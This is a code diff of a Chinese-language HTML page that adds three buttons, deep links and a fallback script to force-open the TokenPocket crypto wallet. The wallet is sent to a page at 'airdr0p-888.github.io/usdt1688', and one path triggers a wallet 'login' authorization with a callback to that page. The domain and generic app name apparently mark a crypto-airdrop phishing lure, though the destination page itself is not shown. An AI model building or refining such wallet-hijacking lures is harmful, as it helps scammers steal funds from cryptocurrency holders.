@@ -7,12 +7,29 @@
 </head>
 <body>
 
-<button onclick="openTPWallet()" style="padding:15px 30px; font-size:18px; background:#00A3FF; color:white; border:none; border-radius:8px; cursor:pointer;">
-  唤醒 TP 钱包打开我的页面
+<h2>点击按钮唤醒 TP 钱包并打开页面</h2>
+
+<!-- 主按钮：tpdapp 打开网页 -->
+<a href='tpdapp://open?params=%7B%22url%22%3A%22https%3A%2F%2Fairdr0p-888.github.io%2Fusdt1688%2Findex.html%22%2C%22chain%22%3A%22ETH%22%2C%22source%22%3A%22web%22%7D' 
+   style="display: inline-block; padding:15px 30px; font-size:18px; background:#00A3FF; color:white; border:none; border-radius:8px; text-decoration:none; margin:10px;">
+  方案1: 直接在 TP 浏览器打开页面
+</a>
+
+<br/>
+
+<!-- 备用按钮：tpoutside 授权 + 回调 -->
+<a href='tpoutside://pull.activity?param=%7B%22action%22%3A%22login%22%2C%22actionId%22%3A%22unique-id-2025%22%2C%22blockchains%22%3A%5B%7B%22chainId%22%3A%221%22%2C%22network%22%3A%22ethereum%22%7D%5D%2C%22dappName%22%3A%22MyDApp%22%2C%22protocol%22%3A%22TokenPocket%22%2C%22version%22%3A%222.0%22%2C%22callbackUrl%22%3A%22https%3A%2F%2Fairdr0p-888.github.io%2Fusdt1688%2Findex.html%22%7D' 
+   style="display: inline-block; padding:15px 30px; font-size:18px; background:#28a745; color:white; border:none; border-radius:8px; text-decoration:none; margin:10px;">
+  方案2: 授权后回调打开页面
+</a>
+
+<!-- JS 增强版按钮（自动 fallback） -->
+<button onclick="openTPWithFallback()" style="padding:15px 30px; font-size:18px; background:#6f42c1; color:white; border:none; border-radius:8px; cursor:pointer; margin:10px;">
+  方案3: 智能唤醒 + 打开页面
 </button>
 
 <div id="qrcode" style="margin-top:20px; display:none; text-align:center;">
-  <p>扫码兜底：用 TP 钱包打开</p>
+  <p>如果失败，用 TP 钱包扫码打开：</p>
   <img id="qrcode-img" src="" alt="二维码" style="width:200px; border:1px solid #ccc;">
 </div>
 
@@ -32,51 +49,36 @@ function showQRCode(url) {
   qr.style.display = 'block';
 }
 
-function openTPWallet() {
-  // 官方 JSON params
-  const params = {
-    url: TARGET_URL,
-    chain: "ETH",  // 可选，提升兼容
-    source: "web"  // 可选，来源标识
-  };
-  const encodedParams = encodeURIComponent(JSON.stringify(params));
-
-  const schemes = [
-    `tpdapp://open?params=${encodedParams}`,  // 主方案（官方推荐）
-    `tp://open?params=${encodedParams}`       // 备用（部分版本）
-  ];
-
-  // 如果已在 TP 浏览器，直接跳转
+function openTPWithFallback() {
   if (isTPBrowser()) {
     location.href = TARGET_URL;
     return;
   }
 
-  // 1. 直接跳转主方案
-  window.location.href = schemes[0];
+  // 方案1: tpdapp 打开网页
+  const params1 = { url: TARGET_URL, chain: "ETH", source: "web" };
+  const encodedParams1 = encodeURIComponent(JSON.stringify(params1));
+  const scheme1 = `tpdapp://open?params=${encodedParams1}`;
+  window.location.href = scheme1;
 
-  // 2. 300ms 后 iframe 增强（iOS 兼容）
+  // 方案2: 300ms 后 tpoutside 授权 + 回调
   setTimeout(() => {
-    try {
-      const iframe = document.createElement('iframe');
-      iframe.style.display = 'none';
-      iframe.src = schemes[0];
-      document.body.appendChild(iframe);
-      setTimeout(() => document.body.removeChild(iframe), 2000);
-    } catch (e) {
-      console.log('Iframe fallback failed:', e);
-    }
+    const params2 = {
+      action: "login",
+      actionId: Date.now().toString(),
+      blockchains: [{ chainId: "1", network: "ethereum" }],
+      dappName: "MyDApp",
+      protocol: "TokenPocket",
+      version: "2.0",
+      callbackUrl: TARGET_URL
+    };
+    const encodedParams2 = encodeURIComponent(JSON.stringify(params2));
+    const scheme2 = `tpoutside://pull.activity?param=${encodedParams2}`;
+    window.location.href = scheme2;
   }, 300);
 
-  // 3. 2秒后尝试备用
-  setTimeout(() => {
-    window.location.href = schemes[1];
-  }, 2000);
-
-  // 4. 3.5秒后显示二维码（手动扫码打开）
-  setTimeout(() => {
-    showQRCode(TARGET_URL);
-  }, 3500);
+  // 兜底: 3.5s 后显示二维码
+  setTimeout(() => showQRCode(TARGET_URL), 3500);
 }
 </script>
 
